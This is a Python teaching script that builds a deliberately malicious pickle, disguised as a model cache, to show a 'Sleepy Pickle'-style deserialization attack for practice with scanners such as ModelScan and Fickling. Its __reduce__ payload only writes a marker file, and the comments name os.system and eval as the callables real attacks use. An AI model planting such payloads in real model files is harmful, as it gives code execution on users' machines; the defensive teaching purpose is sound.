"""
Builds a deliberately malicious pickle file for MLSecOps teaching purposes.

Mirrors the real-world "Sleepy Pickle" technique: a pickle file that,
upon being loaded with pickle.load(), executes an arbitrary payload as a
side effect of deserialization - not because the *data* is malicious, but
because pickle's format allows arbitrary callable invocation during
unpickling via __reduce__.

The payload here is intentionally harmless: it writes a marker file to
prove code execution occurred. It does NOT touch the network, does NOT
read sensitive files, and does NOT persist beyond this demo.

NOTE ON REALISM: in a real attack the attacker does not need to ship a
custom module the way this script does via pickle_payload_module - they
target a callable ALREADY importable in the victim's environment, most
commonly os.system, subprocess.Popen, or builtins.eval. We use a custom
harmless function here purely so this demo's side effect is auditable
and contained, not to suggest real attacks require a custom module.

This artifact does not exist in the original LLMGoat project. It has
been added here purely to teach model/artifact scanning (ModelScan,
Fickling) hands-on, since LLMGoat itself uses the GGUF format, which has
no pickle-style code-execution surface.
"""
import pickle
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "pickle_payload_module"))
from payload_funcs import write_marker  # noqa: E402


class _MaliciousPayload:
    """
    __reduce__ tells the pickle VM: "when you unpickle me, call this
    callable with these arguments." This is the exact mechanism real
    pickle-based ML model attacks (e.g. Sleepy Pickle) use.
    """
    def __reduce__(self):
        marker_path = os.path.join(os.path.dirname(__file__), "PWNED_BY_PICKLE.txt")
        message = (
            "This file was created by a malicious pickle payload executing "
            "during pickle.load(). In a real attack this could have been a "
            "reverse shell, credential theft, or ransomware deployment "
            "instead of a harmless text file.\n"
        )
        return (write_marker, (marker_path, message))


def build():
    # Simulates a "model cache" file an application might load via
    # pickle.load() - e.g. cached embeddings or tokenizer state.
    fake_cache_contents = {
        "embeddings_version": "1.0",
        "payload": _MaliciousPayload(),
    }

    output_path = os.path.join(os.path.dirname(__file__), "models", "cache.pkl")
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "wb") as f:
        pickle.dump(fake_cache_contents, f)

    print(f"Malicious pickle written to: {output_path}")


if __name__ == "__main__":
    build()
